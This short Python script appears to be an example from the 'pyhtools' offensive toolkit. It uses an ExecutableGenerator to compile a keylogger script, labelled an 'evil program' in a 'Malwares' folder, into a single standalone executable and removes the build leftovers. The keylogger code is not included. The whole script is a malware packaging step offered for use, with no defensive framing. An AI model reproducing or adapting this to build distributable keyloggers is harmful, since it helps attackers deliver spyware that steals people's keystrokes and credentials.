from pyhtools.evil_files.exec_generator import (Compilers, ExecutableGenerator)
from os import getcwd

exe = ExecutableGenerator(
    file_path = r'D:\GithubRepos\pyhtools\examples\EvilFiles\Malwares\key_logger.py', # evil program file path
    output_dir = '.', # output directory
    compiler = Compilers.DEFAULT, # compile using DEFAULT, CLANG, MINGW
    onefile = True, # creates single exe file
    remove_output = True, # deletes all compiled files and retains only exe
)

return_code = exe.generate_executable()